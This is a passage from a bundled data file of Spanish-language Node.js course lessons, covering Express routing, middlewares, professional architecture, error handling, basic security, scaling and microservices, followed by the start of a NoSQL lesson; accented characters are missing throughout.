  response.end("Hola desde mi servidor nativo");
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(\`Servidor corriendo en http://localhost:\${PORT}\`);
});
\`\`\`

## 2. Request y Response
*   **Request (req):** Es el objeto que contiene lo que el usuario enva (la URL, los datos del formulario, el navegador que usa).
*   **Response (res):** Es el objeto que usamos para contestarle (el cdigo de estado 200, 404, 500, y el contenido).

## 3. El problema de hacerlo "a mano"
Si queremos que \`/contacto\` devuelva una cosa y \`/perfil\` otra, tendramos que llenar nuestro cdigo de \`if (req.url === '/contacto')\`. Es tedioso y difcil de mantener. Por eso usamos frameworks como **Express**.

## 4. Cdigo de Estados (Bsico)
*   **200:** OK (Todo bien).
*   **404:** Not Found (No existe lo que buscas).
*   **500:** Internal Server Error (Tu cdigo explot).

---

## Mini Ejercicio
Modifica el servidor anterior para que si la URL es \`/html\`, responda con un \`<h1>Hola</h1>\` y el \`Content-Type\` sea \`text/html\`.
`,completed:!1},{id:"node-junior-intro-express",title:"Introduccin a Express.js",level:"junior",content:`# Leccin 7: Introduccin a Express.js

**Express** es el framework web ms popular para Node.js. Es minimalista, rpido y nos hace la vida mucho ms fcil.

## 1. Instalacin
Lo primero es instalarlo como una dependencia:
\`\`\`bash
npm install express
\`\`\`

## 2. Un servidor con Express
Compara este cdigo con el de la leccin anterior. Mucho ms legible, verdad?

\`\`\`javascript
const express = require('express');
const app = express();
const port = 3000;

app.get('/', (req, res) => {
  res.send('Hola Mundo con Express!');
});

app.listen(port, () => {
  console.log(\`App escuchando en http://localhost:\${port}\`);
});
\`\`\`

## 3. Por qu Express?
*   **Routing sencillo:** Manejar URLs es muy intuitivo.
*   **Middlewares:** Permite procesar datos antes de que lleguen a la ruta final.
*   **Plug-and-play:** Existen miles de libreras diseadas especficamente para funcionar con Express.

## 4. El flujo de una peticin en Express
1.  El usuario escribe una URL.
2.  Express busca si tienes una ruta definida para esa URL y para ese **Mtodo HTTP** (GET, POST, etc).
3.  Si la encuentra, ejecuta la funcin callback.
4.  La funcin enva la respuesta con \`res.send()\` o \`res.json()\`.

---

## Mini Ejercicio
Instala Express en un proyecto nuevo y crea una ruta \`/api\` que devuelva un objeto JSON: \`{ "status": "ok", "message": "API funcionando" }\`. Usa \`res.json()\`.
`,completed:!1},{id:"node-junior-rutas",title:"Rutas y Mtodos HTTP",level:"junior",content:`# Leccin 8: Rutas y Mtodos HTTP

En las APIs modernas, usamos los **Mtodos HTTP** para indicar qu queremos hacer con los datos.

## 1. Los 4 mtodos principales (CRUD)
*   **GET:** Para obtener o leer datos.
*   **POST:** Para crear nuevos datos (enviar un formulario, por ejemplo).
*   **PUT:** Para actualizar datos existentes.
*   **DELETE:** Para borrar datos.

\`\`\`javascript
app.get('/usuarios', (req, res) => res.send('Lista de usuarios'));
app.post('/usuarios', (req, res) => res.send('Usuario creado'));
\`\`\`

## 2. Parmetros de Ruta (Rutas Dinmicas)
Cmo sabemos qu usuario especfico queremos ver? Usamos dos puntos \`:\` para definir una variable en la URL.

\`\`\`javascript
app.get('/usuarios/:id', (req, res) => {
  const userId = req.params.id;
  res.send(\`Viendo el perfil del usuario con ID: \${userId}\`);
});
\`\`\`

## 3. Query Params
Son los datos que vienen despus del signo \`?\` en la URL. Se usan para filtrar o buscar.

\`\`\`javascript
// URL: /buscar?color=rojo&talla=L
app.get('/buscar', (req, res) => {
  const { color, talla } = req.query;
  res.send(\`Buscando productos de color \${color} y talla \${talla}\`);
});
\`\`\`

## 4. Error Comn: Olvidar el orden
Express revisa las rutas de **arriba hacia abajo**. Si pones una ruta muy genrica arriba, podra "comerse" a una ruta ms especfica que est abajo. Siempre pon las rutas con parmetros al final.

---

## Mini Ejercicio
Crea una ruta que reciba el nombre de un pas como parmetro (\`/pais/:nombre\`) y responda con "Has buscado el pas: [nombre]".
`,completed:!1},{id:"node-junior-req-res",title:"El objeto Request y Response",level:"junior",content:`# Leccin 9: El objeto Request y Response

Estos dos objetos son los protagonistas de cada funcin de ruta en Express. Vamos a ver sus propiedades ms tiles.

## 1. El objeto Request (req)
Contiene todo lo que viene del cliente.
*   \`req.params\`: Variables de la URL (/:id).
*   \`req.query\`: Variables de bsqueda (?nombre=juan).
*   \`req.body\`: Los datos enviados en un POST (requiere un middleware para leerse).
*   \`req.headers\`: Informacin tcnica (qu navegador usa, si tiene un token de seguridad).

## 2. El objeto Response (res)
Es tu herramienta para contestar.
*   \`res.send()\`: Enva texto u HTML.
*   \`res.json()\`: Enva un objeto JSON (el estndar de las APIs).
*   \`res.status()\`: Define el cdigo de error.
*   \`res.redirect()\`: Manda al usuario a otra pgina.
*   \`res.sendFile()\`: Enva un archivo fsico (imagen, PDF).

## 3. Encadenamiento (Method Chaining)
En Express es comn encadenar mtodos:

\`\`\`javascript
app.get('/error', (req, res) => {
  res.status(404).json({ error: "No encontrado" });
});
\`\`\`

## 4. Error Comn: "Cannot set headers after they are sent"
Este error ocurre cuando intentas enviar **dos respuestas** para una misma peticin. Recuerda: una peticin = una respuesta. Si usas un \`if\`, asegrate de usar \`return res.send()\` para que el cdigo no siga ejecutndose y trate de enviar otra respuesta debajo.

---

## Mini Ejercicio
Crea una ruta que verifique si existe un parmetro \`token\`. Si no existe, devuelve un status 401 (No autorizado) con un JSON de error. Si existe, devuelve un 200 con xito.
`,completed:!1},{id:"node-junior-middlewares",title:"Middlewares (Los Intermediarios)",level:"junior",content:`# Leccin 10: Middlewares (Los Intermediarios)

Un **Middleware** es simplemente una funcin que se ejecuta **antes** de llegar a tu ruta final. Es como un guardia de seguridad que revisa a la gente antes de entrar a un club.

## 1. Cmo se ven?
Tienen tres argumentos: \`req\`, \`res\` y \`next\`. La funcin \`next()\` le dice a Express: "Todo bien, deja pasar al siguiente".

\`\`\`javascript
const miMiddleware = (req, res, next) => {
  console.log(\`Peticin recibida a las \${new Date().toLocaleTimeString()}\`);
  next(); //  Obligatorio! Si no lo pones, la app se queda colgada
};

app.use(miMiddleware); // Se aplica a TODAS las rutas
\`\`\`

## 2. Tipos de Middlewares
*   **De Aplicacin:** Se usan con \`app.use()\` para todo el servidor (ej: logs, seguridad).
*   **De Ruta:** Se ponen entre la URL y la funcin final solo para una ruta especfica.
*   **Incorporados:** Express ya trae algunos, como \`express.json()\` para poder leer el cuerpo de los POST.

## 3. Ejemplo Real: \`express.json()\`
Sin esto, \`req.body\` ser \`undefined\`. Debes ponerlo al principio de tu archivo.

\`\`\`javascript
app.use(express.json());

app.post('/datos', (req, res) => {
  console.log(req.body); // Ahora s podemos verlo
  res.send("Recibido");
});
\`\`\`

## 4. El peligro de no llamar a \`next()\`
Si tu middleware no llama a \`next()\` ni enva una respuesta con \`res.send()\`, el navegador del usuario se quedar cargando infinitamente hasta que de un "Timeout". 

---

## Mini Ejercicio
Crea un middleware que imprima la URL de cada peticin que llegue al servidor. salo de forma global con \`app.use()\`.
`,completed:!1},{id:"node-junior-buenas-practicas",title:"Buenas Prcticas de Inicio",level:"junior",content:`# Leccin 11: Buenas Prcticas de Inicio

Construir un servidor es fcil; construir uno que sea fcil de mantener es el objetivo.

## 1. No subas \`node_modules\` a Git
Esa carpeta es gigante y cualquier desarrollador puede recrearla con \`npm install\`. Crea siempre un archivo \`.gitignore\` y escribe \`node_modules\` dentro.

## 2. Usa Variables de Entorno
Nunca escribas contraseas o el puerto del servidor directamente en el cdigo. Usa una librera llamada \`dotenv\`.
*   Crea un archivo \`.env\` para tus secretos.
*   Lelos con \`process.env.MI_SECRETO\`.

## 3. Divide y Vencers (Estructura de Carpetas)
No pongas 50 rutas en el mismo \`index.js\`.
*   \`routes/\`: Archivos para las URLs.
*   \`controllers/\`: La lgica de qu hacer con los datos.
*   \`models/\`: Estructura de la base de datos.

## 4. Usa herramientas de desarrollo
Instala **Nodemon**: \`npm install --save-dev nodemon\`.
Nodemon reinicia tu servidor automticamente cada vez que guardas un cambio en el cdigo, ahorrndote horas de tiempo.

## 5. Manejo de Errores Global
Siempre ten una ruta final o un middleware que capture errores inesperados para que tu servidor no se caiga ante la primera falla.

\`\`\`javascript
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Algo sali mal!');
});
\`\`\`

---

## Proyecto Final Junior
Crea una API de "Gestin de Estudiantes":
1.  Usa Express y \`npm init\`.
2.  Crea una lista (array) de estudiantes en memoria.
3.  Implementa rutas para:
    *   Ver todos los estudiantes (GET).
    *   Ver un estudiante por ID (GET dinmica).
    *   Agregar un nuevo estudiante (POST con \`express.json\`).
4.  Crea un middleware que registre cada peticin en un archivo \`.txt\` usando el mdulo \`fs\`.

Felicidades! Has dado tus primeros pasos firmes en el mundo del Backend. 
`,completed:!1},{id:"node-junior-ejercicios",title:"Ejercicios Prcticos: Node.js Junior",level:"junior",content:`# Ejercicios Prcticos: Node.js Junior

Aplica lo aprendido construyendo servidores reales. Estos ejercicios te llevarn desde lo ms bsico hasta crear una API funcional.

---

## 1. El Servidor "Reloj Mundial"
**Objetivo:** Practicar el mdulo nativo \`http\` y el objeto \`Response\`.

**Consigna:**
Crea un servidor usando \`http.createServer\` que:
*   Al acceder a \`/\`, responda con un mensaje de bienvenida.
*   Al acceder a \`/hora\`, responda con la fecha y hora actual del servidor en formato texto.
*   Cualquier otra ruta debe devolver un cdigo **404** y el texto "Ruta no encontrada".

**Resultado Esperado:** Un servidor que informa la hora actual dinmicamente segn la peticin.

---

## 2. API de Saludos Personalizados
**Objetivo:** Usar Express y parmetros de ruta (\`req.params\`).

**Consigna:**
Instala Express e implementa una ruta \`GET\` que:
*   Reciba un nombre como parmetro: \`/saludo/:nombre\`.
*   Responda con un JSON: \`{ "mensaje": "Hola [nombre]! Bienvenido al backend." }\`.
*   Si el nombre tiene menos de 3 letras, devuelve un status **400** con un mensaje de error.

**Resultado Esperado:** Una ruta que interacta con la URL y valida la entrada del usuario.

---

## 3. Mini Almacn de Frutas (CRUD en Memoria)
**Objetivo:** Implementar los mtodos GET y POST.

**Consigna:**
Crea una lista de frutas en un array: \`['Manzana', 'Pera']\`.
*   \`GET /frutas\`: Devuelve el array completo.
*   \`POST /frutas\`: Recibe una nueva fruta en el \`body\` y la agrega al array.
*   **Requisito:** Debes usar el middleware \`express.json()\` para que el POST funcione.

**Resultado Esperado:** Poder listar y "guardar" elementos mientras el servidor est encendido.

---

## 4. El "Guardia de Seguridad" (Middlewares)
**Objetivo:** Entender el flujo de los middlewares.

**Consigna:**
Crea un servidor con Express y define un middleware global que:
*   Imprima en consola el mtodo (GET, POST, etc) y la URL de cada peticin.
*   Crea una ruta \`/secreto\` que solo responda si el usuario enva un query param \`password=1234\`.
*   Si el password es incorrecto o no est, corta la peticin y devuelve un **401 (No autorizado)**.

**Resultado Esperado:** Un sistema que registra actividad en consola y protege rutas especficas.

---

## 5. Buscador de Libros con Errores Controlados
**Objetivo:** Integrar lgica de bsqueda y manejo de estados HTTP.

**Consigna:**
Crea un array de objetos \`libros\` (id, titulo, autor).
*   \`GET /libros/:id\`: Busca el libro.
*   Si el libro existe, devulvelo en formato JSON.
*   Si el libro **no existe**, no dejes que la app explote; devuelve un status **404** con un mensaje descriptivo: "Lo sentimos, el libro con ID [id] no est en nuestra biblioteca".

**Resultado Esperado:** Una API robusta que maneja casos de error de forma profesional.

---

A programar! El backend es el cimiento de toda gran aplicacin. 
`,completed:!1,isProject:!0},{id:"node-junior-evaluacion",title:"Evaluacin Node.js Junior",level:"junior",content:'# Evaluacin Final: Node.js Junior\n\nDemuestra que dominas los fundamentos de Node.js, Express y la gestin de paquetes.\n\n## 1. Examen Terico\n*   Qu significa que Node.js sea de "hilo nico" (single-threaded)?\n*   Para qu sirve el archivo `package-lock.json` y por qu es importante no borrarlo?\n*   Explica la diferencia entre `res.send()` y `res.json()`.\n\n## 2. Desafo Prctico: Servidor de Noticias\nCrea un servidor con Express que:\n1. Tenga un array de objetos `noticias` con: `id`, `titulo` y `contenido`.\n2. Implemente una ruta `GET /noticias` para ver todas.\n3. Implemente una ruta `GET /noticias/:id` que devuelva una noticia especfica.\n4. Si el `id` no existe, debe responder con status 404 y un JSON: `{ "error": "Noticia no encontrada" }`.\n\n## 3. Ejercicio de Paquetes y Mdulos\n1. Crea un mdulo llamado `utils.js` que exporte una funcin para formatear fechas.\n2. Instala la librera `moment` o `date-fns` y sala dentro de ese mdulo.\n3. Importa la funcin en tu servidor y sala para agregar una propiedad `fecha_peticion` a cada respuesta de noticias.\n\n## 4. Criterios de Aprobacin\n* [ ] El servidor inicia sin errores con `node server.js`.\n* [ ] Uso correcto de parmetros dinmicos (`req.params`).\n* [ ] Manejo adecuado de cdigos de estado HTTP (200, 404).\n* [ ] El proyecto tiene un `package.json` vlido con sus dependencias.\n',completed:!1,isProject:!0},{id:"node-semi-senior-arquitectura-profesional",title:"Arquitectura y Estructura Profesional",level:"semi-senior",content:`# Leccin 12: Arquitectura y Estructura Profesional

En el nivel Junior, un solo archivo \`index.js\` basta. En el nivel Semi-Senior, construimos sistemas. La meta es que tu cdigo sea **mantenible**, **testeable** y **escalable**.

## 1. El Gran Error: El "Fat Controller"
Un error comn es poner toda la lgica (validacin, base de datos, respuesta) dentro de la ruta.
\`\`\`javascript
//  INCORRECTO: Todo mezclado
app.get('/users', async (req, res) => {
  const data = await db.query('...'); // Acceso a datos
  const filtered = data.filter(...);  // Lgica de negocio
  res.json(filtered);                 // Respuesta
});
\`\`\`

## 2. El Patrn de Capas (Proper Layering)
Dividimos la responsabilidad en 3 capas principales:
1.  **Rutas (Router):** Solo definen los puntos de entrada. 
2.  **Controladores (Controllers):** Orquestan la peticin. No saben de base de datos, llaman a los servicios.
3.  **Servicios (Services):** Aqu vive la "Lgica de Negocio". Consultas a DB, clculos complejos, llamadas a APIs externas.

## 3. Estructura de Carpetas Recomendada
\`\`\`
src/
  app.js            # Configuracin de Express
  server.js         # Punto de entrada (listen)
  routes/           # Definicin de endpoints
  controllers/      # Lgica de orquestacin
  services/         # Lgica de negocio y DB
  middlewares/      # Funciones intermedias
  config/           # Variables de entorno y constantes
  utils/            # Funciones de ayuda
\`\`\`

## 4. Comparativa: Cdigo Sucio vs Cdigo Profesional
**Profesional (Separado):**
\`\`\`javascript
// routes/userRoutes.js
router.get('/', userController.getAll);

// controllers/userController.js
exports.getAll = async (req, res) => {
  const users = await userService.fetchActiveUsers();
  res.json(users);
};
\`\`\`

---

## Mini Ejercicio
Refactoriza un endpoint que tengas creado. Mueve la lgica de la funcin a un archivo llamado \`userController.js\` y exprtala.
`,completed:!1},{id:"node-semi-senior-async-errores",title:"Asincrona y Manejo de Errores Avanzado",level:"semi-senior",content:`# Leccin 13: Asincrona y Manejo de Errores Avanzado

En el backend, el 90% de lo que haces es asncrono. Manejar los errores correctamente es lo que separa a un senior de un junior.

## 1. Adis a los Callbacks y al \`.then()\`
Usamos \`async/await\` porque hace que el cdigo asncrono parezca sncrono y sea mucho ms fcil de leer. Sin embargo, no olvides el \`try/catch\`.

## 2. El "Try/Catch" Global
En lugar de envolver cada ruta en un \`try/catch\` individual (lo cual ensucia el cdigo), usamos un **Wrapper** o un middleware de error global.

\`\`\`javascript
//  CORRECTO: Un patrn de "catchErrors"
const catchErrors = (fn) => (req, res, next) => {
  return fn(req, res, next).catch(next);
};

app.get('/users', catchErrors(async (req, res) => {
  const users = await db.getUsers(); // Si esto falla, va directo al middleware de error
  res.json(users);
}));
\`\`\`

## 3. Middleware de Error Centralizado
Debes tener un lugar donde todos los errores terminen. Esto te permite loguearlos y responder siempre con el mismo formato.

\`\`\`javascript
app.use((err, req, res, next) => {
  const status = err.statusCode || 500;
  res.status(status).json({
    status: 'error',
    message: err.message || 'Error interno del servidor'
  });
});
\`\`\`

## 4. Clases de Error Personalizadas
Crea tus propios tipos de errores para ser ms especfico.

\`\`\`javascript
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
  }
}
// Uso: throw new AppError('Usuario no encontrado', 404);
\`\`\`

---

## Mini Ejercicio
Crea una funcin asncrona que simule una falla (usa \`Promise.reject\`). Luego, intenta capturar ese error usando el patrn \`try/catch\` y registra el error en la consola.
`,completed:!1},{id:"node-semi-senior-seguridad-env",title:"Seguridad y Variables de Entorno",level:"semi-senior",content:"# Leccin 14: Seguridad y Variables de Entorno\n\nUn backend expuesto a internet es un blanco constante. No proteger tus llaves o tu servidor es una negligencia profesional.\n\n## 1. El Peligro del `.env` en Git\n**Nunca, bajo ninguna circunstancia**, subas tu archivo `.env` al repositorio. \n*   **Caso Real:** Un desarrollador subi sus claves de AWS a GitHub. En 5 minutos, un bot las rob y min criptomonedas por valor de $5,000 USD.\n*   **Solucin:** Crea un `.env.example` con las llaves vacas para que otros sepan qu configurar, pero ignora el `.env` real en `.gitignore`.\n\n## 2. Helmet.js: Seguridad por defecto\nExpress viene con algunas cabeceras HTTP que revelan demasiado (como `X-Powered-By: Express`). `Helmet` las oculta y agrega capas de proteccin extra automticamente.\n```bash\nnpm install helmet\n```\n```javascript\nconst helmet = require('helmet');\napp.use(helmet());\n```\n\n## 3. Limitacin de Peticiones (Rate Limiting)\nEvita que un bot bombardee tu servidor con miles de peticiones para tirarlo (Ataque DoS).\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutos\n  max: 100 // Lmite de 100 peticiones por IP\n});\napp.use(limiter);\n```\n\n## 4. CORS (Cross-Origin Resource Sharing)\nSi tu frontend est en un dominio y tu backend en otro, necesitas configurar CORS para que el navegador permita la comunicacin. S especfico, no uses `*` en produccin.\n\n---\n\n## Mini Ejercicio\nInstala `dotenv` y crea un archivo `.env` con un `PORT=4000`. Modifica tu servidor para que lea esa variable usando `process.env.PORT`.\n",completed:!1},{id:"node-semi-senior-validaciones-logging",title:"Validaciones y Logging Profesional",level:"semi-senior",content:`# Leccin 15: Validaciones y Logging Profesional

En una API profesional, no dejas que cualquier dato entre a tu sistema, y no vuelas a ciegas si algo falla.

## 1. Validando Entradas con Joi o Zod
No valides manualmente cada campo con \`if (req.body.name === '')\`. Usa esquemas de validacin.
\`\`\`javascript
//  Ejemplo con Zod
const userSchema = z.object({
  email: z.string().email(),
  age: z.number().min(18)
});

// Middleware de validacin
const validate = (schema) => (req, res, next) => {
  const result = schema.safeParse(req.body);
  if (!result.success) return res.status(400).json(result.error);
  next();
};
\`\`\`

## 2. No uses \`console.log\` en produccin
Los \`console.log\` son pesados, no se pueden apagar fcilmente y no guardan estructura. Usa un Logger profesional como **Winston** o **Pino**.
*   Permiten guardar logs en archivos.
*   Tienen niveles: \`info\`, \`warn\`, \`error\`, \`debug\`.
*   En produccin, puedes silenciar los \`debug\` para no llenar el disco duro.

## 3. Ejemplo de Logging Estructurado
\`\`\`javascript
logger.info('Pago procesado con xito', { orderId: 123, amount: 50.0 });
logger.error('Fallo en conexin con DB', { error: err.message });
\`\`\`

---

## Desafo Semi-Senior Final
Crea una API que:
1.  Tenga una estructura de carpetas profesional.
2.  Use \`dotenv\` para el puerto.
3.  Implemente un middleware de validacin para una ruta \`POST\`.
4.  Tenga un middleware de error global que responda en formato JSON.

A darle tomos! Has subido de nivel. 
`,completed:!1},{id:"node-semi-senior-evaluacion",title:"Evaluacin Node.js Semi-Senior",level:"semi-senior",content:'# Evaluacin Final: Node.js Semi-Senior\n\nEsta evaluacin pone a prueba tu capacidad para estructurar aplicaciones profesionales, manejar asincrona y asegurar el entorno.\n\n## 1. Examen Terico\n*   Qu es la "Lgica de Negocio" y en qu capa de una arquitectura profesional debera vivir?\n*   Explica el patrn "Wrapper" para el manejo de errores en rutas asncronas de Express.\n*   Cules son los riesgos de seguridad vinculados a CORS y cmo configurarlos correctamente en produccin?\n\n## 2. Desafo Prctico: Refactorizacin Profesional\nSe te entrega una API que tiene toda la lgica en un solo archivo `index.js`.\n1. Crea una estructura de carpetas: `routes`, `controllers`, `services`.\n2. Mueve la lgica de una ruta complexa (ej: Buscar productos con filtros) siguiendo el patrn de capas.\n3. Asegrate de usar `async/await` con un manejo de errores centralizado (middleware).\n\n## 3. Seguridad y Configuracin\n1. Configura `dotenv` para manejar el puerto y una clave secreta ficticia `JWT_SECRET`.\n2. Implementa un middleware de validacin usando `Zod` o `Joi` para una ruta de registro que pida: `email` (vlido), `password` (mn 8 carac.) y `rol` (admin o user).\n\n## 4. Logging\n1. Instala `winston` o simula un logger que guarde en un archivo `errors.log` solo cuando ocurra un error de status 500.\n\n## 5. Criterios de Aprobacin\n* [ ] Arquitectura claramente separada (decoplamiento).\n* [ ] Validacin de datos de entrada robusta.\n* [ ] No se exponen secretos en el cdigo (uso de .env).\n* [ ] El sistema siempre responde en JSON, incluso en caso de error.\n',completed:!1,isProject:!0},{id:"node-senior-clean-architecture",title:"Clean Architecture en Node.js",level:"senior",content:`# Leccin 16: Clean Architecture en Node.js

A nivel Senior, el cdigo no se organiza por "libreras" (Express, Mongoose), sino por **dominio de negocio**. La infraestructura es un detalle.

## 1. La Regla de Dependencia
En Clean Architecture, las dependencias solo pueden apuntar **hacia adentro**.
*   **Entidades (Ncleo):** Reglas de negocio puras (ej: un Usuario, un Pedido).
*   **Casos de Uso:** Orquestan el flujo de datos (ej: \`CrearPedido\`, \`CancelarSuscripcion\`).
*   **Adaptadores (Interface Adapters):** Convierten datos entre el ncleo y el mundo exterior (Controllers, Repositorios).
*   **Frameworks y Drivers (Externo):** Express, MongoDB, APIs externas.

## 2. Inyeccin de Dependencias (DI)
Un arquitecto Senior nunca hace \`const db = require('./database')\` dentro de su lgica de negocio.
**Por qu?** Porque eso acopla tu lgica a esa base de datos especfica.

\`\`\`javascript
//  CORRECTO: El servicio recibe sus dependencias
class UserService {
  constructor(userRepository) {
    this.userRepository = userRepository;
  }
  
  async getUser(id) {
    return this.userRepository.findById(id);
  }
}
\`\`\`

## 3. Ventaja: Testeabilidad
Si tu lgica no depende de archivos fsicos sino de interfaces, puedes pasarle un "Mock" en tus tests y probar el 100% de tu cdigo sin haber instalado una base de datos real.

---

## Pregunta de Entrevista Senior
**P:** "Cul es la diferencia entre un Repositorio y un DAO (Data Access Object)?"
**R:** El DAO es un mapeo de la tabla de la DB. El Repositorio es una abstraccin de coleccin del dominio. Un Senior usa Repositorios para que la lgica de negocio no sepa si los datos vienen de SQL, NoSQL o un archivo CSV.
`,completed:!1},{id:"node-senior-escalabilidad",title:"Escalabilidad Horizontal y el Cluster Module",level:"senior",content:`# Leccin 17: Escalabilidad Horizontal y el Cluster Module

Node.js corre en un solo hilo. Si tu servidor tiene 16 ncleos de CPU, Node por defecto solo usar uno, desperdiciando el 94% de tu potencia.

## 1. Escalabilidad Vertical vs Horizontal
*   **Vertical:** Comprar una PC ms potente (Tiene un lmite fsico y econmico).
*   **Horizontal:** Aadir ms instancias de tu servidor (Infinito).

## 2. El Mdulo \`cluster\`
Permite crear copias de tu servidor (Workers) que comparten el mismo puerto.
\`\`\`javascript
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork(); // Crea un worker por cada ncleo
  }
} else {
  // Aqu corre tu servidor Express normal
  http.createServer((req, res) => { ... }).listen(8000);
}
\`\`\`

## 3. Estado en Memoria (El enemigo)
En una arquitectura escalada horizontalmente, **NUNCA** guardes datos en variables (\`let users = []\`).
Si un usuario se loguea en el Worker 1 y su siguiente peticin llega al Worker 2, para el servidor ese usuario no existe.
*   **Solucin:** Usa una sesin centralizada en **Redis**.

## 4. PM2: El estndar en produccin
En lugar de manejar el cluster a mano, usamos PM2:
\`pm2 start app.js -i max\`
Esto levanta automticamente el nmero mximo de instancias segn los ncleos de tu servidor y los reinicia si fallan.

---

## Desafo Tcnico
Investiga qu es el "Sticky Session" y por qu es un antipatrn en la mayora de los casos modernos (Stateless APIs).
`,completed:!1},{id:"node-senior-performance-profiling",title:"Performance, Profiling y Memory Leaks",level:"senior",content:`# Leccin 18: Performance, Profiling y Memory Leaks

Un desarrollador Senior es un detective de la performance. No optimiza por sospecha, optimiza por **evidencia**.

## 1. El Costo del Event Loop
Si el Event Loop se retrasa ms de 50ms, la experiencia del usuario se degrada.
*   **Herramienta:** \`clinic.js\` para visualizar cuellos de botella.
*   **Causa comn:** Operaciones con JSON gigantes o encriptacin pesada en el hilo principal.

## 2. Memory Leaks (Fugas de Memoria)
Ocurre cuando guardas datos en variables globales y nunca los limpias. Eventualmente, el recolector de basura (V8 Garbage Collector) no puede limpiar la RAM y el servidor explota con un \`Out of Memory\`.
*   **Profiling:** Usa \`--inspect\` de Node para conectar las Chrome DevTools a tu servidor y ver el Heap Snapshot.

## 3. Streams: La clave para datos grandes
**Caso Real:** Tienes que enviar un archivo de 2GB al usuario.
*   **Junior:** \`fs.readFile()\` (Carga 2GB en RAM, explota el servidor).
*   **Senior:** \`fs.createReadStream()\` (Enva pedazos de 64KB de disco a red sin tocar la RAM).

## 4. Worker Threads
Para tareas de CPU pesadas (criptografa, procesamiento de imgenes), Node permite usar hilos reales adicionales con el mdulo \`worker_threads\`.

---

## Pregunta Senior
"Cmo manejaras una API que recibe 100,000 registros por segundo?"
**R:** No los escribira a la DB directamente. Usara un sistema de mensajera (RabbitMQ, Kafka) como buffer para que el backend los procese a su propio ritmo sin saturar la base de datos (Backpressure).
`,completed:!1},{id:"node-senior-microservicios",title:"Microservicios y API Gateways",level:"senior",content:`# Leccin 19: Microservicios y API Gateways

Cuando una aplicacin crece demasiado (Monolito), se vuelve lenta de desplegar y arriesgada de modificar. Pasamos a **Microservicios**.

## 1. El concepto
Cada funcionalidad vive en su propio servidor independiente (Node, Go, Python).
*   Ventaja: Si falla el servicio de "Notificaciones", el servicio de "Pagos" sigue funcionando.

## 2. Comunicacin entre servicios
*   **Sincrnica (HTTP/gRPC):** El servicio A llama al B y espera respuesta. (Fcil, pero crea acoplamiento).
*   **Asincrnica (Event-Driven):** El servicio A publica un evento ("PagoRealizado") en un Bus (Redis, RabbitMQ) y el servicio B lo escucha cuando puede.

## 3. API Gateway
No queremos que el frontend sepa las 20 URLs de nuestros microservicios. Ponemos una cara visible (Gateway) que recibe todo y lo redirige internamente. Adems, el Gateway maneja la **autenticacin centralizada**.

## 4. El "Distributed Tracing"
Si una peticin pasa por 5 servicios y falla en el cuarto, cmo lo rastreas?
*   **Solucin:** \`Correlation IDs\`. Un ID nico que viaja en los headers de todas las llamadas entre servicios.

---

## Desafo Senior
Disea un sistema donde el servicio de \`Usuarios\` debe informar al servicio de \`Email\` que enve un correo de bienvenida. Usaras HTTP o un Mensaje en una cola? Justifica tu respuesta basada en la tolerancia a fallos.
`,completed:!1},{id:"node-senior-evaluacion",title:"Evaluacin Node.js Senior",level:"senior",content:`# Evaluacin Final: Node.js Senior

Demuestra tu capacidad para disear y diagnosticar sistemas de alta disponibilidad.

## 1. Diseo de Arquitectura (Escenario Real)
"Estamos construyendo un sistema de reserva de entradas para un concierto masivo (tipo Taylor Swift). Esperamos 1 milln de usuarios en el primer minuto."
1. Describe cmo evitaras el "Race Condition" (que dos personas compren el mismo asiento).
2. Cmo protegeras la base de datos de ser saturada?
3. Qu estrategia de cach usaras?

## 2. Diagnstico de Produccin
El equipo de monitoreo reporta que el uso de CPU de los servidores Node sube al 100% y se mantiene ah, pero el trfico no ha aumentado. 
1. Qu herramientas usaras para encontrar el problema?
2. Menciona 3 causas posibles de este comportamiento.

## 3. Seguridad Crtica
1. Un hacker est intentando un ataque de \`Replay Attack\` capturando tokens JWT vlidos. Cmo lo mitigaras sin invalidar todos los tokens del sistema?
2. Explica la diferencia entre \`Inyeccin NoSQL\` y \`SQL Injection\` en el contexto de Node.

## 4. Performance Profunda
Se tiene un array de 5 millones de objetos en memoria y se necesita realizar una bsqueda compleja que bloquea el Event Loop por 2 segundos. 
1. Propn una solucin usando \`Worker Threads\`.
2. Propn una solucin alternativa moviendo esa lgica fuera de Node.

## 5. Criterios de Aprobacin
* [ ] Capacidad de justificar decisiones tecnolgicas basadas en tradeoffs (ventajas/desventajas).
* [ ] Conocimiento profundo de las libreras de infraestructura (Redis, RabbitMQ, Docker).
* [ ] Enfoque preventivo ante fallos (observabilidad y resiliencia).
`,completed:!1,isProject:!0}]},T1={id:"nosql",title:"Bases de Datos NoSQL",description:"Domina los sistemas de datos no relacionales, la escalabilidad horizontal y el modelado flexible.",completed:!1,track:"Backend & Data",lessons:[{id:"nosql-01-fundamentos",title:"Fundamentos NoSQL",level:"junior",content:`# Leccin 1: Fundamentos NoSQL

NoSQL no significa "No SQL", sino "Not Only SQL". Es un cambio de paradigma para manejar datos a gran escala.

## 1. Qu es NoSQL?
Son bases de datos que no siguen el modelo relacional tradicional de tablas y filas predefinidas. Estn diseadas para ser flexibles y escalar masivamente.

## 2. SQL vs NoSQL: El Gran Duelo
| Caracterstica | SQL (Relacional) | NoSQL (No Relacional) |
| :--- | :--- | :--- |
| **Esquema** | Rgido (Tablas fijas) | Flexible (Sin esquema o dinmico) |
| **Escalabilidad** | Vertical (Ms potente) | Horizontal (Ms mquinas) |
| **Relaciones** | Complejas (JOINs) | Desnormalizado (Documentos) |
| **Ideal para** | Datos estructurados, transacciones financieras | Datos masivos, redes sociales, logs, tiempo real |

## 3. Escalabilidad Horizontal (Sharding)
*   **SQL:** Si te quedas sin espacio, compras un servidor ms grande (ms RAM/CPU). Tiene un lmite fsico.
*   **NoSQL:** Si te quedas sin espacio, agregas 10 servidores baratos ms. La base de datos reparte los datos entre todos. Esto es el **Sharding**.

## 4. Cundo usar cada uno
*   **Usa SQL si:** Los datos son muy estructurados y las relaciones son vitales (ej: Un banco).
*   **Usa NoSQL si:** No sabes exactamente qu datos guardars, necesitas velocidad extrema de escritura, o los datos crecen sin control.

---

### Misin Junior:
